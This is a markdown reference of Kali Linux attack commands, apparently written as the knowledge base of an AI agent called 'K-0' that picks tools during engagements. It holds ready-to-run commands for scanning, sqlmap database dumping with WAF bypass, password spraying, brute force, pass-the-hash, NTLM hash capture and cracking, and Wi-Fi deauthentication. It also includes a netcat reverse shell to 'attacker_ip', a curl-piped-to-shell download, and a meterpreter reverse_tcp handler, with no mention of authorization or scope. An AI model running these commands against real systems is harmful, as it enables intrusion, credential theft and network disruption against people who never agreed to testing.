# K-0 · Kali Tools Reference

Complete operational knowledge of the Kali Linux toolset.
K-0 uses this to select the right tool and interpret its output correctly.

---

## RECONNAISSANCE & SCANNING

### nmap — the backbone of every engagement
```bash
# Host discovery (ping sweep, no port scan)
nmap -sn 192.168.1.0/24

# Standard service scan
nmap -sV -sC -T4 --open -oA scan_results target

# Full port scan
nmap -p- -T4 --min-rate 5000 target

# Stealth SYN scan (requires root)
nmap -sS -T4 target

# OS detection + version + scripts
nmap -A -T4 target

# UDP top 100 ports (background)
nmap -sU --top-ports 100 -T3 target &

# Vuln scripts
nmap --script vuln target
nmap --script=http-shellshock,http-sql-injection target

# NSE categories: auth, brute, default, discovery, exploit, external, fuzzer,
#                 intrusive, malware, safe, version, vuln
```
**Output interpretation:** Focus on open ports, service versions (check exploitdb), and script results.
Filtered = firewall, Closed = no service but reachable.

---

### masscan — fast internet-scale scanner
```bash
# Full port scan, very fast
masscan -p1-65535 target --rate=10000 -oL masscan.txt

# Feed to nmap for service detection
nmap -sV -p $(cat masscan.txt | awk '{print $3}' | tr '\n' ',') target
```

---

### subfinder / assetfinder — subdomain enumeration
```bash
subfinder -d example.com -o subs.txt
assetfinder --subs-only example.com >> subs.txt
sort -u subs.txt > all_subs.txt

# Resolve alive ones
cat all_subs.txt | httpx -silent -o alive.txt
```

---

### amass — deep subdomain + OSINT enumeration
```bash
amass enum -passive -d example.com -o amass_passive.txt
amass enum -active -d example.com -brute -o amass_active.txt
amass intel -whois -d example.com
```

---

### whatweb — web fingerprinting
```bash
whatweb -a 3 http://target  # aggression level 1-4
whatweb --log-json=output.json http://target
```

---

## WEB APPLICATION TESTING

### nikto — web server scanner
```bash
nikto -h http://target -o nikto.txt
nikto -h http://target -ssl   # HTTPS
nikto -h http://target -Tuning 9  # SQL injection tests
# Tuning: 1=XSS, 2=files, 3=misc, 4=injection, 5=RFI, 6=denial, 7=remote, 8=cmd, 9=SQL, 0=upload
```
**Don't just run nikto and move on.** Read every line. "OSVDB-xxx" entries are old but still valid.

---

### ffuf — fastest directory/vhost fuzzer
```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://target/FUZZ -mc 200,301,302,403

# File extension fuzzing
ffuf -w wordlist.txt -u http://target/FUZZ -e .php,.asp,.aspx,.bak,.old -mc 200

# Parameter fuzzing
ffuf -w params.txt -u "http://target/page?FUZZ=value" -mc 200

# Vhost discovery
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" -u http://target -fs 0

# Filter: -fs (size), -fw (words), -fc (code), -fl (lines)
```
**Wordlists:** `/usr/share/wordlists/dirb/`, `/usr/share/seclists/Discovery/`

---

### gobuster — directory/DNS/vhost bruter
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,js
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u http://target -w subdomains.txt
```

---

### wpscan — WordPress specialist
```bash
# Enumerate everything
wpscan --url http://target -e ap,at,cb,dbe,u --plugins-detection aggressive

# With API token (more CVE data)
wpscan --url http://target --api-token TOKEN -e vp

# User enumeration
wpscan --url http://target -e u

# Password spray
wpscan --url http://target -U admin -P /usr/share/wordlists/rockyou.txt
```
**What to look for:** Outdated plugins (most WordPress vulns), version disclosure, user enumeration via `/wp-json/wp/v2/users`.

---

### sqlmap — SQL injection automation
```bash
# Basic
sqlmap -u "http://target/page?id=1" --batch

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# From burp request file
sqlmap -r request.txt --batch

# Dump database
sqlmap -u "http://target?id=1" --dbs --batch
sqlmap -u "http://target?id=1" -D dbname --tables --batch
sqlmap -u "http://target?id=1" -D dbname -T users --dump --batch

# Bypass WAF
sqlmap -u "http://target?id=1" --tamper=space2comment,between --batch
```

---

### burpsuite — manual web testing (community)
Key features without Pro:
- Intercept proxy (port 8080 by default)
- Repeater for manual manipulation
- Intruder for basic fuzzing (slow without Pro)
- Decoder for encoding/decoding
- Comparer for response diffing

Set browser proxy to 127.0.0.1:8080, import burp CA cert.

---

## NETWORK ATTACKS

### netcat / ncat — swiss army knife
```bash
# Listen for reverse shell
nc -lvnp 4444

# Connect back (reverse shell)
nc -e /bin/bash attacker_ip 4444

# File transfer
nc -lvnp 4444 > received_file        # receiver
nc target 4444 < file_to_send       # sender

# Banner grabbing
nc -v target 80
```

---

### responder — LLMNR/NBT-NS poisoning
```bash
responder -I eth0 -rdwv
# Captures NTLMv2 hashes from Windows hosts doing broadcast name lookups
# Feed captured hashes to hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```
**Huge in internal engagements.** Works without touching a single host directly.

---

### crackmapexec (cme/nxc) — Windows network auditing
```bash
# SMB enumeration
crackmapexec smb 192.168.1.0/24

# Password spraying
crackmapexec smb targets.txt -u users.txt -p 'Password123!' --continue-on-success

# Pass-the-hash
crackmapexec smb targets.txt -u admin -H NTHASH

# Execute command
crackmapexec smb target -u admin -p password -x "whoami"

# Spider shares
crackmapexec smb target -u admin -p password --shares --spider SHARENAME
```

---

### enum4linux / enum4linux-ng — SMB/Samba enumeration
```bash
enum4linux-ng -A target -oA enum_results
# Gets: shares, users, groups, password policy, OS info
```

---

### smbclient — SMB interaction
```bash
# List shares
smbclient -L //target -N

# Connect to share
smbclient //target/SHARENAME -U username

# Download all files
smbclient //target/SHARENAME -U user -c "recurse ON; mget *"
```

---

### hydra — network login brute force
```bash
# SSH
hydra -l admin -P rockyou.txt ssh://target

# HTTP form
hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP, RDP, SMB, VNC, MySQL...
hydra -L users.txt -P passwords.txt ftp://target
```

---

## EXPLOITATION

### searchsploit — ExploitDB lookup
```bash
searchsploit apache 2.4
searchsploit -x 44268        # display exploit
searchsploit -m 44268        # copy to current dir
searchsploit --cve 2021-41773  # search by CVE
```

---

### metasploit — see METASPLOIT.md for full reference

Quick ops:
```bash
msfconsole -q     # quiet start
msfdb run         # start with database
msf6> search type:exploit name:apache rank:excellent
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST tun0
msf6> run -j      # run as job
```

---

## POST-EXPLOITATION

### linpeas / winpeas — privilege escalation enum
```bash
# Linux
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or serve it
python3 -m http.server 8080   # on attacker
wget http://attacker/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```
**Look for:** SUID binaries, writable cron jobs, weak passwords in config files, kernel version, sudo -l output.

---

### pwncat — enhanced reverse shell handler
```bash
pwncat-cs -lp 4444
# Once connected: (local) help
# File upload/download, privilege escalation automation
```

---

## PASSWORD ATTACKS

### hashcat — GPU password cracking
```bash
# Identify hash type: hashid or hash-identifier
hashcat -m 0 hash.txt rockyou.txt          # MD5
hashcat -m 1000 hash.txt rockyou.txt       # NTLM
hashcat -m 5600 hash.txt rockyou.txt       # NTLMv2
hashcat -m 1800 hash.txt rockyou.txt       # sha512crypt
hashcat -m 22000 hash.txt rockyou.txt      # WPA2

# Rules (much better than raw wordlist)
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### john the ripper
```bash
john hash.txt --wordlist=rockyou.txt
john hash.txt --format=NT --wordlist=rockyou.txt
john --show hash.txt
```

---

## WIRELESS

### aircrack-ng suite
```bash
# Set monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Capture handshakes
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth (force reconnect for handshake capture)
aireplay-ng --deauth 10 -a BSSID -c CLIENT wlan0mon

# Crack WPA2
aircrack-ng -w rockyou.txt -b BSSID capture-01.cap
hashcat -m 22000 capture.hc22000 rockyou.txt
```

---

## FORENSICS & MISC

### strings / file / exiftool — quick file analysis
```bash
file suspicious_file
strings suspicious_file | grep -i password
exiftool image.jpg   # metadata, GPS, author, software
```

### steghide / stegseek — steganography
```bash
steghide extract -sf image.jpg
stegseek image.jpg rockyou.txt  # fast steg crack
```

---

## WORDLISTS

Essential locations on Kali:
```
/usr/share/wordlists/rockyou.txt         # passwords (14M)
/usr/share/seclists/                     # SecLists collection (install: apt install seclists)
/usr/share/wordlists/dirb/common.txt     # web directories
/usr/share/wordlists/dirb/big.txt        # bigger web directories  
/usr/share/wordlists/dirbuster/          # more directory lists
/usr/share/seclists/Passwords/           # password lists
/usr/share/seclists/Discovery/DNS/       # subdomain wordlists
/usr/share/seclists/Discovery/Web-Content/ # web path lists
```
